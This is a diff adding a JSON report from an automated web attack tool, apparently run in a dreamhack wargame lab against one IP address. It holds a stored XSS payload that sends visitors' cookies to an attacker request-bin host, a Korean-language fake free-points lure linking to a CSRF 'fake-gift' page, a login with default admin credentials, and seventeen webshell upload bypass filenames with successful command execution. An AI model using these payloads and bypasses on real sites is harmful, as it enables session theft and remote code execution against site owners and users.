@@ -1,0 +1,541 @@
+{
+  "metadata": {
+    "target": "http://52.78.221.104",
+    "attacker_server": "https://vtfdwtn.request.dreamhack.games",
+    "start_time": "2025-11-10 14:17:07",
+    "end_time": "2025-11-10 14:17:28",
+    "duration_seconds": 21,
+    "attacker_user_id": "1",
+    "tool_version": "1.0"
+  },
+  "summary": {
+    "total_vulnerabilities": 19,
+    "critical_count": 19,
+    "high_count": 0,
+    "vulnerability_breakdown": {
+      "sql_injection": 0,
+      "file_upload": 17,
+      "lfi": 0,
+      "xss": 1,
+      "csrf": 1
+    }
+  },
+  "vulnerabilities": {
+    "sql_injection": [],
+    "xss": [
+      {
+        "url": "http://52.78.221.104/add_comment.php",
+        "payload": "<script>var cookieData = document.cookie;var i = new Image();i.src = \"https://vtfdwtn.request.dreamhack.games?cookie=\"+cookieData;</script>",
+        "description": "Image XSS in Comment",
+        "type": "Stored XSS",
+        "impact": "CRITICAL - Cookie/Session theft possile",
+        "cvss_score": 9.0,
+        "attack_vector": "https://vtfdwtn.request.dreamhack.games"
+      }
+    ],
+    "csrf": [
+      {
+        "url": "http://52.78.221.104/new_post.php",
+        "payload": "🎁 특별 이벤트! 🎁\n\n무료 10,000 포인트 받기!\n지금 클릭하세요: https://vtfdwtn.request.dreamhack.games/fake-gift\n\n선착순 100명! 서두르세요!",
+        "description": "Advanced CSRF with multiple bypass techniques",
+        "attack_type": "advanced_csrf",
+        "target_url": "https://vtfdwtn.request.dreamhack.games/fake-gift",
+        "attacker_id": "1",
+        "impact": "CRITICAL - CSRF with token bypass attempts",
+        "cvss_score": 9.0
+      }
+    ],
+    "lfi": [],
+    "file_upload": [
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.jpg.php",
+        "actual_filename": "shell98.jpg.php",
+        "bypass_technique": "Double extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.jpg.php&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.php.jpg",
+        "actual_filename": "shell98.php.jpg",
+        "bypass_technique": "Reverse double extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.php.jpg&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.PHP",
+        "actual_filename": "shell98.PHP",
+        "bypass_technique": "Uppercase extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.PHP&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.PhP",
+        "actual_filename": "shell98.PhP",
+        "bypass_technique": "Mixed case extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.PhP&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.pHp",
+        "actual_filename": "shell98.pHp",
+        "bypass_technique": "Mixed case variant",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.pHp&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.php5",
+        "actual_filename": "shell98.php5",
+        "bypass_technique": "PHP5 extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.php5&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.phtml",
+        "actual_filename": "shell98.phtml",
+        "bypass_technique": "PHTML extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.phtml&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.php3",
+        "actual_filename": "shell98.php3",
+        "bypass_technique": "PHP3 extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.php3&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.php4",
+        "actual_filename": "shell98.php4",
+        "bypass_technique": "PHP4 extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.php4&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.phps",
+        "actual_filename": "shell98.phps",
+        "bypass_technique": "PHPS extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.phps&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.phar",
+        "actual_filename": "shell98.phar",
+        "bypass_technique": "PHAR extension",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.phar&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.php",
+        "actual_filename": "shell98.php",
+        "bypass_technique": "Unicode h",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.php&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.jpg",
+        "actual_filename": "shell98.jpg",
+        "bypass_technique": "JPEG header with PHP",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.jpg&cmd=whoami",
+        "impact": "CRITICAL - Image file executed as PHP code",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98 .php",
+        "actual_filename": "shell98 .php",
+        "bypass_technique": "Space in filename",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98 .php&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.php.",
+        "actual_filename": "shell98.php.",
+        "bypass_technique": "Trailing dot",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.php.&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell98.php....",
+        "actual_filename": "shell98.php....",
+        "bypass_technique": "Multiple trailing dots",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell98.php....&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      },
+      {
+        "upload_url": "http://52.78.221.104/upload.php",
+        "filename": "shell.php5",
+        "actual_filename": "shell.php5",
+        "bypass_technique": "htaccess override (via .htaccess)",
+        "command": "whoami",
+        "output": "apache",
+        "access_url": "http://52.78.221.104/file.php?name=shell.php5&cmd=whoami",
+        "impact": "CRITICAL - Remote Code Execution via advanced file upload bypass",
+        "cvss_score": 10.0
+      }
+    ]
+  },
+  "attack_timeline": [
+    {
+      "timestamp": "2025-11-10 14:17:07",
+      "type": "SCAN_START",
+      "description": "Advanced security assessment started on http://52.78.221.104",
+      "severity": "INFO",
+      "details": {}
+    },
+    {
+      "timestamp": "2025-11-10 14:17:10",
+      "type": "WEAK_CREDENTIALS",
+      "description": "Logged in with default credentials: admin/admin123",
+      "severity": "HIGH",
+      "details": {
+        "username": "admin",
+        "password": "admin123"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:10",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Double extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.jpg.php",
+        "bypass_method": "Double extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:10",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Reverse double extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.php.jpg",
+        "bypass_method": "Reverse double extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Uppercase extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.PHP",
+        "bypass_method": "Uppercase extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Mixed case extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.PhP",
+        "bypass_method": "Mixed case extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Mixed case variant",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.pHp",
+        "bypass_method": "Mixed case variant",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: PHP5 extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.php5",
+        "bypass_method": "PHP5 extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: PHTML extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.phtml",
+        "bypass_method": "PHTML extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: PHP3 extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.php3",
+        "bypass_method": "PHP3 extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: PHP4 extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.php4",
+        "bypass_method": "PHP4 extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: PHPS extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.phps",
+        "bypass_method": "PHPS extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: PHAR extension",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.phar",
+        "bypass_method": "PHAR extension",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Unicode h",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.php",
+        "bypass_method": "Unicode h",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:11",
+      "type": "FILE_UPLOAD_RCE_IMAGE",
+      "description": "Image file executed as PHP: shell98.jpg",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.jpg",
+        "bypass_method": "JPEG header with PHP",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:12",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Space in filename",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98 .php",
+        "bypass_method": "Space in filename",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:12",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Trailing dot",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.php.",
+        "bypass_method": "Trailing dot",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:12",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: Multiple trailing dots",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": "shell98.php....",
+        "bypass_method": "Multiple trailing dots",
+        "variant": "basic",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:12",
+      "type": "FILE_UPLOAD_RCE_ADVANCED",
+      "description": "Successfully uploaded and executed webshell using: htaccess override",
+      "severity": "CRITICAL",
+      "details": {
+        "filename": ".htaccess -> shell.php5",
+        "bypass_method": "htaccess override",
+        "variant": "htaccess",
+        "test_command": "whoami",
+        "output": "apache"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:28",
+      "type": "SETUP",
+      "description": "Generated advanced CSRF attack page with multiple bypass techniques",
+      "severity": "INFO",
+      "details": {
+        "filename": "advanced-fake-gift.html",
+        "techniques": [
+          "token_extraction",
+          "clickjacking",
+          "form_csrf",
+          "xhr_csrf",
+          "get_csrf",
+          "websocket_csrf"
+        ],
+        "attacker_id": "1"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:28",
+      "type": "CSRF_ADVANCED",
+      "description": "Advanced CSRF attack deployed with multiple bypass techniques",
+      "severity": "CRITICAL",
+      "details": {
+        "post_url": "http://52.78.221.104/new_post.php",
+        "attack_url": "https://vtfdwtn.request.dreamhack.games/fake-gift",
+        "attacker_id": "1",
+        "techniques": [
+          "token_extraction",
+          "clickjacking",
+          "json_csrf",
+          "xhr_hijack"
+        ]
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:28",
+      "type": "SETUP",
+      "description": "Generated advanced CSRF attack page with multiple bypass techniques",
+      "severity": "INFO",
+      "details": {
+        "filename": "advanced-fake-gift.html",
+        "techniques": [
+          "token_extraction",
+          "clickjacking",
+          "form_csrf",
+          "xhr_csrf",
+          "get_csrf",
+          "websocket_csrf"
+        ],
+        "attacker_id": "1"
+      }
+    },
+    {
+      "timestamp": "2025-11-10 14:17:28",
+      "type": "SCAN_COMPLETE",
+      "description": "Advanced assessment completed. 19 vulnerabilities found",
+      "severity": "INFO",
+      "details": {}
+    }
+  ],
+  "artifacts": {
+    "uploaded_webshell": "shell.php5",
+    "fake_gift_page": "advanced-fake-gift.html"
+  }
+}
